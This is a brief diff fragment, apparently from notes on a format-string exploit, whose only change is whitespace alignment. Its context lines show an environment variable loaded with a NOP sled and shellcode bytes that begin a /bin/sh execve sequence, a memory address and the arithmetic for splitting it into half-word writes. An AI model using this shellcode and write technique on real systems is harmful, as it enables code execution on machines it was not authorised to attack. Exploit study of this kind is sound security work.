@@ -30,7 +30,7 @@ export SHELLCODE=`python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x
 0xffffd8a6:	0x90909090
 
 0xffffd8a6		d8a6		ffff
-				55462		65535
+				   55462		65535
 
 65535 - 55462 = 10073
 
